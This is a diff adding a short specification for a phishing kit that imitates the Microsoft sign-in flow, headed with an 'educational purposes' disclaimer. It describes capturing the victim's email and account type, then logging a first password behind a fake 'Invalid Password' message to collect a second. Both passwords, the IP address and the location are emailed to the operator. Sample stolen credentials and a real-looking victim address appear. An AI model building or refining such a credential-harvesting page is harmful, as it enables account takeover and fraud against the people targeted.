@@ -1,0 +1,26 @@
+THIS SCRIPT IS FOR OFFENSIVE SECURITY CLASS (SOLELY FOR EDUCATIONAL PURPOSES)
+
+
+
+-Page one (index) is where user will input thier microsoft account
+
+- You can hover on the selector page, the email inputed in the index should replace "camott@commonwealthepoxy.com" and both "work or school account" and "Personal account" should be clickable and selection should be logged. Once one of these options are clicked, it should redirect to the 3rd page which is the password page.
+
+
+- After password is typed, the first password should be logged as well but a response written in red should display on the page showing "Invalid Password" while the page stays on screen.
+second attempt should then submit the sign in form and redirected to inbox.
+
+
+- sameple php attached.Sample php is not totally accurate,its just included for you to have an idea of what to do. 
+
+the logs should be sent to an email address in the sample php in the following arrangement;
+
+Email: bruce@accesstrials.com
+Password 1: Not4u2no# (1st attempt)
+Password 2: NOtjustok (2nd attempt)
+IP: 174.225.143.156
+Country: United States - US
+City: Jersey City
+Region: New Jersey
+
+
